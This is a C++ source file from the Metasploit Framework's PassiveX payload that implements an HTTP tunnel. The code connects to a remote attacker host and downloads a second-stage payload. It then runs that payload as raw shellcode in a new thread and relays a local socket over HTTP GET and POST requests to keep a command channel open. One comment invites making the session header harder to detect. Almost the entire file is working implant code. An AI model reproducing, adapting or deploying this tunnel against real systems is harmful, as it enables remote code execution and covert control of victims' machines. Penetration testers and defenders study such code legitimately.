/*
 * This file is part of the Metasploit Exploit Framework
 * and is subject to the same licenses and copyrights as
 * the rest of this package.
 */
#include "PassiveXLib.h"
#include "HttpTunnel.h"

// The number of failed HTTP connections
static DWORD FailedConnections = 0;

HttpTunnel::HttpTunnel()
: HttpHost(NULL),
  HttpUriBase(NULL),
  HttpSid(NULL),
  HttpPort(0),
  LocalTcpListener(0),
  LocalTcpClientSide(0),
  LocalTcpServerSide(0),
  InternetHandle(NULL),
  SendThread(NULL),
  ReceiveThread(NULL),
  SecondStageThread(NULL),
  SecondStage(NULL),
  SecondStageSize(0)
{
	// Initialize winsock, not that we should need to.
	WSAStartup(
			MAKEWORD(2, 2),
			&WsaData);

	srand(time(NULL));
}

HttpTunnel::~HttpTunnel()
{
	Stop();

	// Cleanup winsock
	WSACleanup();
}

/*
 * Initiates the HTTP tunnel and gets the ball rolling
 */
DWORD HttpTunnel::Start(
		IN LPSTR InHttpHost,
		IN LPSTR InHttpUriBase,
		IN LPSTR InHttpSid,
		IN USHORT InHttpPort)
{
	DWORD ThreadId;
	DWORD Result = ERROR_SUCCESS;

	do
	{
		// Initialize the hostname and port
		if (!(HttpHost = strdup(InHttpHost)))
		{
			Result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		if ((InHttpSid) &&
		    (InHttpSid[0]) &&
		    (!(HttpSid = strdup(InHttpSid))))
		{
			Result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		if ((InHttpUriBase) &&
		    (InHttpUriBase[0]) && 
		    (!(HttpUriBase = strdup(InHttpUriBase))))
		{
			Result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Eliminate any trailing slashes as to prevent potential problems.  If
		// HttpUriBase is just "/", then it'll become virtuall unused.
		if ((HttpUriBase) &&
		    (HttpUriBase[strlen(HttpUriBase) - 1] == '/'))
			HttpUriBase[strlen(HttpUriBase) - 1] = 0;

		HttpPort = InHttpPort;

		// Acquire the internet context handle
		if (!(InternetHandle = InternetOpen(
				NULL,
				INTERNET_OPEN_TYPE_PRECONFIG,
				NULL,
				NULL,
				0)))
		{
			Result = GetLastError();
			break;
		}

		// Create the local TCP abstraction
		if ((Result = InitializeLocalConnection()) != ERROR_SUCCESS)
		{
			CPassiveX::Log(
					TEXT("Start(): InitializeLocalConnection failed, %lu.\n"),
					Result);
			break;
		}

		// Download the second stage if there is one
		DownloadSecondStage();

		// Create the transmission thread
		if (!(SendThread = CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)SendThreadFuncSt,
				this,
				0,
				&ThreadId)))
		{
			Result = GetLastError();
			break;
		}

		// Create the receive thread
		if (!(ReceiveThread = CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)ReceiveThreadFuncSt,
				this,
				0,
				&ThreadId)))
		{
			Result = GetLastError();
			break;
		}

		// Woop
		Result = ERROR_SUCCESS;

	} while (0);

	return Result;
}

/*
 * Stops the HTTP tunnel and cleans up resources
 */
DWORD HttpTunnel::Stop()
{
	DWORD    Result = ERROR_SUCCESS;
	DWORD    Index = 0;
	LPHANDLE Threads[] = 
	{
		&SecondStageThread,
		&ReceiveThread,
		&SendThread,
		NULL
	};

	// Terminate the threads that were spawned
	for (Index = 0;
	     Threads[Index];
	     Index++)
	{
		LPHANDLE Thread = Threads[Index];

		if (*Thread)
		{
			TerminateThread(
					*Thread,
					0);

			CloseHandle(
					*Thread);

			*Thread = NULL;
		}
	}

	// Close all of the open sockets we may have
	if (LocalTcpListener)
		closesocket(
				LocalTcpListener);
	if (LocalTcpClientSide)
		closesocket(
				LocalTcpClientSide);
	if (LocalTcpServerSide)
		closesocket(
				LocalTcpServerSide);

	LocalTcpListener   = 0;
	LocalTcpClientSide = 0;
	LocalTcpServerSide = 0;

	// Free up memory associated with the second stage
	if (SecondStage)
	{
		free(
				SecondStage);

		SecondStage     = NULL;
		SecondStageSize = 0;
	}

	// Close the global internet handle acquired from InternetOpen
	if (InternetHandle)
	{
		InternetCloseHandle(
				InternetHandle);

		InternetHandle = NULL;
	}

	return Result;
}

/*********************
 * Protected Methods *
 *********************/

/*
 * Creates the local TCP abstraction that will be used as the socket for the
 * second stage that is read in
 */
DWORD HttpTunnel::InitializeLocalConnection()
{
	struct sockaddr_in Sin;
	USHORT             LocalPort = 0;
	DWORD              Attempts = 0;
	DWORD              Result = ERROR_SUCCESS;

	do
	{
		// Create the TCP listener socket
		if ((LocalTcpListener = socket(
				AF_INET,
				SOCK_STREAM,
				IPPROTO_TCP)) == INVALID_SOCKET)
		{
			LocalTcpListener = 0;
			Result           = WSAGetLastError();
			break;
		}

		// Create the TCP client socket
		if ((LocalTcpClientSide = socket(
				AF_INET,
				SOCK_STREAM,
				IPPROTO_TCP)) == INVALID_SOCKET)
		{
			LocalTcpClientSide = 0;
			Result             = WSAGetLastError();
			break;
		}

		Sin.sin_family      = AF_INET;
		Sin.sin_addr.s_addr = inet_addr("127.0.0.1");

		// Try 256 times to pick a random port
		Sin.sin_port = htons(LocalPort = (rand() % 32000) + 1025);

		while ((bind(
				LocalTcpListener,		
				(struct sockaddr *)&Sin,
				sizeof(Sin)) == SOCKET_ERROR) &&
		       (Attempts++ < 256))
		{
			Sin.sin_port = htons(LocalPort = (rand() % 32000) + 1025);
		}

		// If we failed to create the local listener, bomb out
		if (Attempts >= 256)
		{
			Result = WSAGetLastError();
			break;
		}

		// Listen and stuff
		if (listen(
				LocalTcpListener,
				1) == SOCKET_ERROR)
		{
			Result = WSAGetLastError();
			break;
		}

		// Establish a connection to the local listener
		if (connect(
				LocalTcpClientSide,
				(struct sockaddr *)&Sin,
				sizeof(Sin)) == SOCKET_ERROR)
		{
			Result = WSAGetLastError();
			break;
		}

		// Accept the local TCP connection
		if ((LocalTcpServerSide = accept(
				LocalTcpListener,
				NULL,
				NULL)) == SOCKET_ERROR)
		{
			LocalTcpServerSide = 0;

			Result = WSAGetLastError();
			break;
		}

		// Woop!
		Result = ERROR_SUCCESS;

	} while (0);

	return Result;
}

/*
 * Downloads the second stage payload from the remote HTTP host and executes it
 * in its own thread if there is one
 */
VOID HttpTunnel::DownloadSecondStage()
{
	// Transmit the request to download the second stage.  The stage buffer that
	// is passed back is never deallocated.
	if ((TransmitHttpRequest(
			TEXT("GET"),
			PASSIVEX_URI_SECOND_STAGE,
			NULL,
			0,
			30000,
			NULL,
			(PVOID *)&SecondStage,
			&SecondStageSize) == ERROR_SUCCESS) &&
	    (SecondStageSize))
	{
		DWORD ThreadId = 0;

		CPassiveX::Log(
				TEXT("DownloadSecondStage(): Downloaded %lu byte second stage, executing it...\n"),
				SecondStageSize);

		// Create the second stage thread
		SecondStageThread = CreateThread(
				NULL,
				0,
				(LPTHREAD_START_ROUTINE)SecondStageThreadFuncSt,
				this,
				0,
				&ThreadId);
	}
	else
	{
		CPassiveX::Log(
				TEXT("DownloadSecondStage(): Failed to download second stage, %lu."),
				GetLastError());

		ExitProcess(0);

	}
}

/*
 * Transmits the supplied data to the remote HTTP host
 */
DWORD HttpTunnel::TransmitToRemote(
		IN PUCHAR Buffer,
		IN ULONG BufferSize)
{
	CPassiveX::Log(
			TEXT("TransmitToRemote(): Transmitting %lu bytes of data to the remote side of the TCP abstraction.\n"),
			BufferSize);

	return TransmitHttpRequest(
			"POST",
			PASSIVEX_URI_TUNNEL_IN,
			Buffer,
			BufferSize);
}

/*
 * Transmits the supplied data to the server side of the local TCP abstraction
 */
DWORD HttpTunnel::TransmitToLocal(
		IN PUCHAR Buffer,
		IN ULONG BufferSize)
{
	DWORD Result = ERROR_SUCCESS;
	INT   BytesWritten = 0;

	// Keep writing until everything has been written
	while (BufferSize > 0)
	{
		CPassiveX::Log(
				TEXT("TransmitToLocal(): Transmitting %lu bytes of data to the local side of the TCP abstraction.\n"),
				BufferSize);

		if ((BytesWritten = send(
				LocalTcpServerSide,
				(const char *)Buffer,
				BufferSize,
				0)) == SOCKET_ERROR)
		{
			Result = WSAGetLastError();
			break;
		}

		Buffer     += BytesWritten;
		BufferSize -= BytesWritten;
	}
	
	return Result;
}

/*
 * Transmits an HTTP request to the target host, optionally waiting for a
 * response
 */
DWORD HttpTunnel::TransmitHttpRequest(
		IN LPTSTR Method,
		IN LPTSTR Uri,
		IN PVOID RequestPayload,
		IN ULONG RequestPayloadLength,
		IN ULONG WaitResponseTimeout,
		OUT LPDWORD ResponseCode,
		OUT PVOID *ResponsePayload,
		OUT LPDWORD ResponsePayloadLength)
{
	HINTERNET RequestHandle = NULL;
	HINTERNET ConnectHandle = NULL;
	PUCHAR    OutBuffer = NULL;
	DWORD     OutBufferLength = 0;
	UCHAR     ReadBuffer[8192];
	DWORD     ReadBufferLength;
	DWORD     Result = ERROR_SUCCESS;
	PCHAR     AdditionalHeaders = NULL;
	CHAR      FullUri[1024];

	// Construct the full URI
	if (HttpUriBase && HttpUriBase[0])
		_snprintf(FullUri, sizeof(FullUri) - 1,
				"%s%s",
				HttpUriBase, Uri);
	else
		strncpy(FullUri, Uri, sizeof(FullUri) - 1);

	FullUri[sizeof(FullUri) - 1] = 0;

	do
	{
		PROFILE_CHECKPOINT("InternetConnect ==>");

		// Open a connection handle
		if (!(ConnectHandle = InternetConnect(
				InternetHandle,
				HttpHost,
				HttpPort,
				NULL,
				NULL,
				INTERNET_SERVICE_HTTP,
				0,
				NULL)))
		{
			Result = GetLastError();
			break;
		}
		
		PROFILE_CHECKPOINT("InternetConnect <==");

		// If we were supplied a wait response timeout, set it
		if (WaitResponseTimeout)
			InternetSetOption(
					ConnectHandle,
					INTERNET_OPTION_RECEIVE_TIMEOUT,
					&WaitResponseTimeout,
					sizeof(WaitResponseTimeout));

		PROFILE_CHECKPOINT("HttpOpenRequest ==>");

		// Open a request handle
		if (!(RequestHandle = HttpOpenRequest(
				ConnectHandle,
				Method ? Method : TEXT("GET"),
				FullUri,
				NULL,
				NULL,
				NULL,
				INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE |
				INTERNET_FLAG_RELOAD,
				NULL)))
		{
			Result = GetLastError();
			break;
		}

		// If we were assigned an HTTP session identifier, then allocate an
		// additional header for transmission to the remote side.
		if (HttpSid)
		{
			// Yeah, I'm lame, this is easy to sig.  Improve me if you care!
			if ((AdditionalHeaders = (PCHAR)malloc(strlen(HttpSid) + 32)))
				sprintf(AdditionalHeaders,
						"X-Sid: sid=%s\r\n",
						HttpSid);
		}
		
		PROFILE_CHECKPOINT("HttpOpenRequest <==");
		PROFILE_CHECKPOINT("HttpSendRequest ==>");

		// Send and endthe request
		if ((!HttpSendRequest(
				RequestHandle,
				AdditionalHeaders,
				(AdditionalHeaders) ? -1L : 0,
				RequestPayload,
				RequestPayloadLength)))
		{
			Result = GetLastError();
			break;
		}

		PROFILE_CHECKPOINT("HttpSendRequest <==");

		// If we wont be waiting for a response, break out now and return
		if (!WaitResponseTimeout)
		{
			Result = ERROR_SUCCESS;
			break;
		}
		
		// Keep looping until we've read the entire request or an error is
		// encountered
		while (1)
		{
			PUCHAR NewBuffer;

			ReadBufferLength = sizeof(ReadBuffer);

			PROFILE_CHECKPOINT("InternetReadFile ==>");

			if (!InternetReadFile(
					RequestHandle,
					ReadBuffer,
					ReadBufferLength,
					&ReadBufferLength))
			{
				Result = GetLastError();
				break;
			}
			else if (!ReadBufferLength)
			{
				Result = ERROR_SUCCESS;
				break;
			}
			
			PROFILE_CHECKPOINT("InternetReadFile <==");

			// Append the buffer to the output buffer
			if (!OutBuffer)
				NewBuffer = (PUCHAR)malloc(
						ReadBufferLength);
			else
				NewBuffer = (PUCHAR)realloc(
						OutBuffer, 
						OutBufferLength + ReadBufferLength);
						
			if (!NewBuffer)
			{
				Result = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}
			
			memcpy(
					NewBuffer + OutBufferLength,
					ReadBuffer,
					ReadBufferLength);

			OutBuffer        = NewBuffer;
			OutBufferLength += ReadBufferLength;
		}

		// Query the status code of the response
		if (ResponseCode)
		{
			DWORD ResponseCodeSize = sizeof(DWORD);

			if (!HttpQueryInfo(
					RequestHandle,
					HTTP_QUERY_STATUS_CODE,
					ResponseCode,
					&ResponseCodeSize,
					NULL))
			{
				CPassiveX::Log(
						TEXT("HttpQueryInfo failed, %lu."),
						GetLastError());

				*ResponseCode = 0;
			}
		}

	} while (0);
			
	PROFILE_CHECKPOINT("Finished TransmitHttpRequest");

	// Close handles
	if (RequestHandle)
		InternetCloseHandle(
				RequestHandle);
	if (ConnectHandle)
		InternetCloseHandle(
				ConnectHandle);
	if (AdditionalHeaders)
		free(AdditionalHeaders);

	// Set the output pointers or free up the output buffer
	if (Result == ERROR_SUCCESS)
	{
		if (ResponsePayload)
			*ResponsePayload = OutBuffer;
		if (ResponsePayloadLength)
			*ResponsePayloadLength = OutBufferLength;
		
		FailedConnections = 0;
	}
	else
	{		
		// If we fail to connect...
		if (Result == ERROR_INTERNET_CANNOT_CONNECT)
		{
			FailedConnections++;

			if (FailedConnections > 10)
			{
				CPassiveX::Log("TransmitHttpRequest(): Failed to connect to HTTP server (%lu), exiting.",
						FailedConnections);

				ExitProcess(0);
			}
		}

		if (OutBuffer)
			free(
					OutBuffer);
	}

	return Result;
}

/*
 * Method wrapper
 */
ULONG HttpTunnel::SendThreadFuncSt(
		IN HttpTunnel *Tunnel)
{
	return Tunnel->SendThreadFunc();
}

/*
 * Monitors the server side of the local TCP abstraction for data that can be
 * transmitted to the remote half of the pipe
 */
ULONG HttpTunnel::SendThreadFunc()
{
	fd_set FdSet;
	UCHAR  ReadBuffer[16384];
	LONG   BytesRead;
	INT    Result;

	// This is the song that never ends...
	while (1)
	{
		FD_ZERO(
				&FdSet);
		FD_SET(
				LocalTcpServerSide,
				&FdSet);
	
		PROFILE_CHECKPOINT("select ==>");

		// Wait for some data...
		Result = select(
				LocalTcpServerSide + 1,
				&FdSet,
				NULL,
				NULL,
				NULL);
		
		PROFILE_CHECKPOINT("select <==");

		// If select failed or there was no new data, act accordingly else risk
		// the fist of the evil witch
		if (Result < 0)
		{
			CPassiveX::Log(
					TEXT("SendThreadFunc(): TUNNEL_IN: Select failed, %lu.\n"),
					WSAGetLastError());
			break;
		}
		else if (Result == 0)
			continue;
		
		PROFILE_CHECKPOINT("recv ==>");

		// Read in data from the local server side of the TCP connection
		BytesRead = recv(
				LocalTcpServerSide,
				(char *)ReadBuffer,
				sizeof(ReadBuffer),
				0);
		
		PROFILE_CHECKPOINT("recv <==");

		// On error or end of file...
		if (BytesRead <= 0)
		{
			CPassiveX::Log(
					TEXT("SendThreadFunc(): TUNNEL_IN: Read 0 or fewer bytes, erroring out (%lu).\n"),
					BytesRead);
			break;
		}

		CPassiveX::Log(
				TEXT("SendThreadFunc(): TUNNEL_IN: Transmitting %lu bytes of data to remote side.\n"),
				BytesRead);
		
		PROFILE_CHECKPOINT("TransmitToRemote ==>");

		// Transmit the data to the remote side
		if ((Result = TransmitToRemote(
				ReadBuffer,
				BytesRead)) != ERROR_SUCCESS)
		{
			CPassiveX::Log(
					TEXT("SendThreadFunc(): TUNNEL_IN: TransmitToRemote failed, %lu.\n"),
					Result);
		}
		
		PROFILE_CHECKPOINT("TransmitToRemote <==");
	}

	// Exit the process if the send thread ends
	ExitProcess(0);

	return 0;
}

/*
 * Method wrapper
 */
ULONG HttpTunnel::ReceiveThreadFuncSt(
		IN HttpTunnel *Tunnel)
{
	return Tunnel->ReceiveThreadFunc();
}

/*
 * Polls for data that should be sent to the local server side of the TCP
 * abstraction
 */
ULONG HttpTunnel::ReceiveThreadFunc()
{
	PUCHAR ReadBuffer = NULL;
	DWORD  ReadBufferLength = 0;
	DWORD  ResponseCode = 0;

	while (1)
	{
		ReadBufferLength = 0;
		ReadBuffer       = NULL;
		ResponseCode     = 0;

		if ((TransmitHttpRequest(
				TEXT("GET"),
				PASSIVEX_URI_TUNNEL_OUT,
				NULL,
				0,
				30000,
				&ResponseCode,
				(PVOID *)&ReadBuffer,
				&ReadBufferLength) == ERROR_SUCCESS) &&
		    (ReadBuffer))
		{
			CPassiveX::Log(
					TEXT("ReceiveThreadFunc(): TUNNEL_OUT: Received response code %lu, buffer length %lu.\n"),
					ResponseCode,
					ReadBufferLength);

			TransmitToLocal(
					ReadBuffer,
					ReadBufferLength);

			free(
					ReadBuffer);
		}
		else
		{
			CPassiveX::Log(
					TEXT("ReceiveThreadFunc(): TUNNEL_OUT: TransmitHttpRequest failed, %lu.\n"),
					GetLastError());
		}
	}

	return 0;
}

/*
 * Calls the second stage after initializing the proper registers
 */
ULONG HttpTunnel::SecondStageThreadFuncSt(
		IN HttpTunnel *Tunnel)
{
	SOCKET Fd = Tunnel->LocalTcpClientSide;

	// Initialize edi to the file descriptor that the second stage might use
	__asm
	{
		lea eax, [Fd]
		mov edi, [eax]
	}

	((VOID (*)())Tunnel->SecondStage)();

	return 0;
}
